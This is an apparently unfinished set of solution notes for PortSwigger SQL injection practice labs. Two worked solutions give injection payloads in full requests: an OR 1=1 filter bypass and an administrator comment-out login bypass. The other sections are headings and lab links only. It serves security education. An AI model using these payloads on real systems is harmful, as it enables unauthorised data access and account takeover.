
## Basics

### Retrieving hidden data

#### Description
Find a way to display all the products including non-released ones to solve this lab.

https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

#### Solution
1. Intercept the request with gifts category filter applied.
2. Modify the category as `Gifts'+OR+1=1--` in the category filter GET request endpoint.
   
   ```
    GET /filter?category=Gifts'+OR+1=1-- HTTP/2
   ```

### Login bypass

#### Description
Find a way to bypass login without valid password.

https://portswigger.net/web-security/sql-injection/lab-login-bypass

#### Solution
1. Navigate to login page by clicking on my account link.
2. Intercept the request for login after entering username as administrator and password as test.
3. Modify the username as `administrator'--` login POST request payload.
   
   ```
    csrf=XhmdnmmWIGWqfJ9MERCaWrdWSYBCO18H&username=administrator'--&password=test
   ```

## Examining the database

### Querying oracle database
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

### Querying mysql database
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

### Listing contents non-oracle database
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

### Listing contents oracle database
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle


## Union attacks

### Determine number of columns in a table
https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

### Find column containing text
https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text


https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

## Blind SQL injection

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

